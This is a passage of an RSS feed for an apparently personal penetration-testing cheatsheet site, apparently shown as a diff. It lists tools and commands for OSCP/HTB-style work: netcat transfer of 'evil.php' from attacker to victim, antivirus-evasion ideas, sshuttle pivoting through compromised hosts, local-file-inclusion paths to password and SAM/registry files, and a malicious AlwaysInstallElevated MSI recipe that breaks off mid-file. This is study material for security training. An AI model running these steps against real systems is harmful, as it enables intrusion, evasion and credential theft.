+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To mount it:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sudo mount -t cifs //192.168.42.42/tools ~/my_share/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To list mounted shares:&lt;/p&gt;</description></item><item><title>Screenshooting</title><link>https://ceso.github.io/resources/tools/screenshooting/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/tools/screenshooting/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/michenriksen/aquatone"&gt;https://github.com/michenriksen/aquatone&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/FortyNorthSecurity/EyeWitness"&gt;https://github.com/FortyNorthSecurity/EyeWitness&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/breenmachine/httpscreenshot"&gt;https://github.com/breenmachine/httpscreenshot&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/maaaaz/webscreenshot"&gt;https://github.com/maaaaz/webscreenshot&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Signature/Heuristics</title><link>https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/signature_heuristics/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/antivirus_bypassing/signature_heuristics/</guid><description>&lt;h1 id="signature-bypass"&gt;Signature Bypass&lt;/h1&gt;
+&lt;p&gt;For example, we can obfuscate the code ciphering and/or encoding (having a decipher/decoding routine in the code), as also leverage tools dedicated for this purpose.
+Another thing is to use NOT common name for functions, variable names, etc; lunfardos, slang, idioisms, weird words from the dictionary, etc.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id="heuristics-bypass"&gt;Heuristics Bypass&lt;/h1&gt;
+&lt;p&gt;As for the heuristics for example AV&amp;rsquo;s tend to execute the malware inside a sandbox, we could have code for detecting if running inside a sandbox and exit if this is true.
+I could use the following techniques:&lt;/p&gt;</description></item><item><title>Sockets</title><link>https://ceso.github.io/cheatsheets/hacking/exfiltration/sockets/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/exfiltration/sockets/</guid><description>&lt;p&gt;Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
+Create the socket with:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Attacker:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; nc -lvnp 443 &amp;lt; evil.php
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;For both cases from windows, the only difference is to write nc.exe
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Victim:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; nc -v 192.168.42.42 443 &amp;gt; evil.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>sshuttle</title><link>https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/pivoting/sshuttle/</guid><description>&lt;h1 id="one-hop"&gt;One hop&lt;/h1&gt;
+&lt;p&gt;Let&amp;rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &amp;ldquo;vpn&amp;rdquo; to talk directly to those servers, for that, we use:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;sshuttle ceso@192.168.20.35 192.168.30.0/24
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id="multi-hops"&gt;Multi-hops&lt;/h1&gt;
+&lt;p&gt;Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &amp;ldquo;vpn&amp;rdquo; through this multiple hops, so&amp;hellip;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&amp;rsquo;t intend to provide a 100% precise network diagram):&lt;/p&gt;</description></item><item><title>Twitter Accounts</title><link>https://ceso.github.io/resources/general_hacking/twitter_accounts/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/general_hacking/twitter_accounts/</guid><description>&lt;ul&gt;
+&lt;li&gt;securibee: &lt;a href="https://twitter.com/securibee"&gt;https://twitter.com/securibee&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;codingo_: &lt;a href="https://twitter.com/codingo"&gt;https://twitter.com/codingo&lt;/a&gt;_&lt;/li&gt;
+&lt;li&gt;hakluke: &lt;a href="https://twitter.com/hakluke"&gt;https://twitter.com/hakluke&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;JackRhysider: &lt;a href="https://twitter.com/JackRhysider"&gt;https://twitter.com/JackRhysider&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Orange Tsai: &lt;a href="https://twitter.com/orange_8361"&gt;https://twitter.com/orange_8361&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;MalwareTech: &lt;a href="https://twitter.com/MalwareTechBlog"&gt;https://twitter.com/MalwareTechBlog&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;TomTomNom: &lt;a href="https://twitter.com/TomNomNom"&gt;https://twitter.com/TomNomNom&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Jason Haddix: &lt;a href="https://twitter.com/Jhaddix"&gt;https://twitter.com/Jhaddix&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;NahamSec: &lt;a href="https://twitter.com/NahamSec"&gt;https://twitter.com/NahamSec&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;STOK: &lt;a href="https://twitter.com/stokfredrik"&gt;https://twitter.com/stokfredrik&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;John Hammond: &lt;a href="https://twitter.com/_johnhammond"&gt;https://twitter.com/_johnhammond&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Jake Williams: &lt;a href="https://twitter.com/MalwareJake"&gt;https://twitter.com/MalwareJake&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Deviant Ollman: &lt;a href="https://twitter.com/deviantollam"&gt;https://twitter.com/deviantollam&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;J3rryBl4nks: &lt;a href="https://twitter.com/JBl4nks"&gt;https://twitter.com/JBl4nks&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Tib3rius: &lt;a href="https://twitter.com/0xTib3rius"&gt;https://twitter.com/0xTib3rius&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;TheColonial: &lt;a href="https://twitter.com/TheColonial"&gt;https://twitter.com/TheColonial&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Rob Fuller: &lt;a href="https://twitter.com/mubix"&gt;https://twitter.com/mubix&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;g0tmi1k: &lt;a href="https://twitter.com/g0tmi1k"&gt;https://twitter.com/g0tmi1k&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;TJ_Null: &lt;a href="https://twitter.com/TJ_Null"&gt;https://twitter.com/TJ_Null&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Rasta Mouse: &lt;a href="https://twitter.com/_RastaMouse"&gt;https://twitter.com/_RastaMouse&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;ippsec: &lt;a href="https://twitter.com/ippsec"&gt;https://twitter.com/ippsec&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Chema Alonso: &lt;a href="https://twitter.com/chemaalonso"&gt;https://twitter.com/chemaalonso&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;FalconSpy: &lt;a href="https://twitter.com/0xFalconSpy"&gt;https://twitter.com/0xFalconSpy&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Minh: &lt;a href="https://twitter.com/WhiteHoodHacker"&gt;https://twitter.com/WhiteHoodHacker&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;0verfl0w: &lt;a href="https://twitter.com/0verfl0w"&gt;https://twitter.com/0verfl0w&lt;/a&gt;_&lt;/li&gt;
+&lt;li&gt;Markus Höfer: &lt;a href="https://twitter.com/HashtagMarkus"&gt;https://twitter.com/HashtagMarkus&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Jonas L: &lt;a href="https://twitter.com/jonasLyk"&gt;https://twitter.com/jonasLyk&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Will Dormann: &lt;a href="https://twitter.com/wdormann"&gt;https://twitter.com/wdormann&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Scott Piper: &lt;a href="https://twitter.com/0xdabbad00"&gt;https://twitter.com/0xdabbad00&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Useful Wordlists</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/useful_wordlists/</guid><description>&lt;h1 id="most-usefull-dictionaries-oscphtb"&gt;Most usefull dictionaries (OSCP/HTB)&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/usr/share/wordlists/wfuzz/others/common_pass.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="in-seclists-pkg"&gt;In seclists-pkg&lt;/h1&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
+/usr/share/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt
+/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id="assetnote"&gt;Assetnote&lt;/h1&gt;
+&lt;p&gt;Up-to-date lists are in the general webpage and there are many more than the ones here listed&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;https://wordlists.assetnote.io/
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ideally, all of them can be downloaded just at once running&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;wget -r --no-parent -R &amp;#34;index.html*&amp;#34; https://wordlists-cdn.assetnote.io/data/ -nH -e robots=off
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="api-fuzzing"&gt;API Fuzzing&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;https://wordlists-cdn.assetnote.io/data/automated/httparchive_apiroutes_2025_09_27.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id="kiterunner"&gt;Kiterunner&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-large.json.tar.gz
+https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz
+https://wordlists-cdn.assetnote.io/rawdata/kiterunner/routes-small.json.tar.gz
+https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz
+https://wordlists-cdn.assetnote.io/rawdata/kiterunner/swagger-files.tar
+https://wordlists-cdn.assetnote.io/data/kiterunner/swagger-wordlist.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h1 id="local-file-inclusion-lfi"&gt;Local File Inclusion (LFI)&lt;/h1&gt;
+&lt;h2 id="linux"&gt;Linux&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/proc/self/status
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/proc/self/environ
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/etc/exports
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="windows"&gt;Windows&lt;/h2&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;C:/Users/Administrator/NTUser.dat
+C:/Documents and Settings/Administrator/NTUser.dat
+C:/apache/logs/access.log
+C:/apache/logs/error.log
+C:/apache/php/php.ini
+C:/boot.ini
+C:/inetpub/wwwroot/global.asa
+C:/MySQL/data/hostname.err
+C:/MySQL/data/mysql.err
+C:/MySQL/data/mysql.log
+C:/MySQL/my.cnf
+C:/MySQL/my.ini
+C:/php4/php.ini
+C:/php5/php.ini
+C:/php/php.ini
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/logs/access.log
+C:/Program Files/Apache Group/Apache/logs/error.log
+C:/Program Files/FileZilla Server/FileZilla Server.xml
+C:/Program Files/MySQL/data/hostname.err
+C:/Program Files/MySQL/data/mysql-bin.log
+C:/Program Files/MySQL/data/mysql.err
+C:/Program Files/MySQL/data/mysql.log
+C:/Program Files/MySQL/my.ini
+C:/Program Files/MySQL/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
+C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/access.log
+C:/Program Files (x86)/Apache Group/Apache/conf/error.log
+C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
+C:/Program Files (x86)/xampp/apache/conf/httpd.conf
+C:/WINDOWS/php.ini C:/WINDOWS/Repair/SAM
+C:/Windows/repair/system C:/Windows/repair/software
+C:/Windows/repair/security
+C:/WINDOWS/System32/drivers/etc/hosts
+C:/Windows/win.ini
+C:/WINNT/php.ini
+C:/WINNT/win.ini
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/logs/access.log
+C:/xampp/apache/logs/error.log
+C:/Windows/Panther/Unattend/Unattended.xml
+C:/Windows/Panther/Unattended.xml
+C:/Windows/debug/NetSetup.log
+C:/Windows/system32/config/AppEvent.Evt
+C:/Windows/system32/config/SecEvent.Evt
+C:/Windows/system32/config/default.sav
+C:/Windows/system32/config/security.sav
+C:/Windows/system32/config/software.sav
+C:/Windows/system32/config/system.sav
+C:/Windows/system32/config/regback/default
+C:/Windows/system32/config/regback/sam
+C:/Windows/system32/config/regback/security
+C:/Windows/system32/config/regback/system
+C:/Windows/system32/config/regback/software
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;</description></item><item><title>Web</title><link>https://ceso.github.io/cheatsheets/hacking/good_to_know/web/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/good_to_know/web/</guid><description>&lt;h1 id="ip-restriction-at-application-level---bypass"&gt;IP restriction at application level - Bypass&lt;/h1&gt;
+&lt;p&gt;Try to send a request modifying the HTTP header by adding:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;X-Forwarder-For: &amp;lt;ip allowed&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Web Browser Plugins</title><link>https://ceso.github.io/resources/tools/browser_plugins/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/tools/browser_plugins/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.wappalyzer.com/download/"&gt;https://www.wappalyzer.com/download/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/"&gt;https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;mdash; For Firefox&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp"&gt;https://chrome.google.com/webstore/detail/foxyproxy-standard/gcknhkkoolaabfmlnjonogaaifnjlfnp&lt;/a&gt; &lt;strong&gt;&amp;lt;&amp;mdash;&amp;mdash; For Chrome&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://cookie-editor.cgagnier.ca/#download"&gt;https://cookie-editor.cgagnier.ca/#download&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/"&gt;https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Web directorie/file scanner</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/web_directorie_file_scanner/</guid><description>&lt;h1 id="gobuster"&gt;Gobuster&lt;/h1&gt;
+&lt;p&gt;Scan all the directories/files by extension:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;gobuster dir -u http://192.168.24.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,py -o webscan/gobuster-extensions
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For scanning without extensions, just take out the -x&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id="nikto"&gt;Nikto&lt;/h1&gt;
+&lt;p&gt;Sometimes Nikto shows juicy information, I tend to run it like:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;nikto -Format txt -o webscan/nikto-initial -host http://192.168.24.24 -p 8080
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="fuff"&gt;fuff&lt;/h1&gt;
+&lt;p&gt;Web fuzzer, &lt;a href="https://github.com/ffuf/ffuf"&gt;you can get fuff here&lt;/a&gt;, it basically bruteforces the dirs.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.24.24/FUZZ
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Web Security</title><link>https://ceso.github.io/resources/books/web_security/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/resources/books/web_security/</guid><description>&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470"&gt;https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/"&gt;https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;</description></item><item><title>Windows</title><link>https://ceso.github.io/cheatsheets/hacking/enumeration/windows/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/enumeration/windows/</guid><description>&lt;h1 id="trusted-folders"&gt;Trusted Folders&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;accesschk.exe &amp;#34;ceso&amp;#34; C:\ -wus
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; -w is to locate writable directories
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; -u supress errors
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -&amp;gt; -s makes recursion on all subdirectories
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;icacls.exe C:\Windows\Tasks
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ^-- Verify if Tasks has execution permissions for example (flag is &amp;#34;RX&amp;#34;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="check-os-information"&gt;Check OS Information&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;systeminfo
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ver
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="check-architecture"&gt;Check Architecture&lt;/h1&gt;
+&lt;h2 id="without-powershell"&gt;Without PowerShell&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;wmic os get osarchitecture
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo %PROCESSOR_ARCHITECTURE%
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="with-powershell"&gt;With PowerShell&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;[Environment]::Is64BitProcess
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h1 id="check-the-type-of-language-available-with-powershell"&gt;Check the Type of Language available with Powershell&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-console" data-lang="console"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ExecutionContext.SessionState.LanguageMode
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&lt;/span&gt;Possible types are:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - Full Language
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - RestrictedLanguage
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - No Language
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - Constrained Language
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;</description></item><item><title>Windows</title><link>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/</link><pubDate>Fri, 03 Oct 2025 00:00:00 +0000</pubDate><guid>https://ceso.github.io/cheatsheets/hacking/privilege_escalation/windows/</guid><description>&lt;h1 id="always-install-elevated"&gt;Always Install Elevated&lt;/h1&gt;
+&lt;p&gt;If we have enabled a privilege which allow us to ALWAYS install with elevated privileges, we can craft a .msi leveranging wixt
+ools, specifically with candl.exe and light.exe.
+The steps are as follows:&lt;/p&gt;
+&lt;p&gt;1 - Create a malicious .xml wix file:&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code class="language-texinfo" data-lang="texinfo"&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
+&amp;lt;Wix xmlns=&amp;#34;http://schemas.microsoft.com/wix/2006/wi&amp;#34;&amp;gt;
+ &amp;lt;Product Id=&amp;#34;*&amp;#34; UpgradeCode=&amp;#34;12345678-1234-1234-1234-111111111111&amp;#34; Name=&amp;#34;Example Product Name&amp;#34; Version=&amp;#34;0.0.1&amp;#34; Manufacture
+r=&amp;#34;@_xpn_&amp;#34; Language=&amp;#34;1033&amp;#34;&amp;gt;
+ &amp;lt;Package InstallerVersion=&amp;#34;200&amp;#34; Compressed=&amp;#34;yes&amp;#34; Comments=&amp;#34;Windows Installer Package&amp;#34;/&amp;gt;
+ &amp;lt;Media Id=&amp;#34;1&amp;#34; Cabinet=&amp;#34;product.cab&amp;#34; EmbedCab=&amp;#34;yes&amp;#34;/&amp;gt;
+ &amp;lt;Directory Id=&amp;#34;TARGETDIR&amp;#34; Name=&amp;#34;SourceDir&amp;#34;&amp;gt;
+ &amp;lt;Directory Id=&amp;#34;ProgramFilesFolder&amp;#34;&amp;gt;
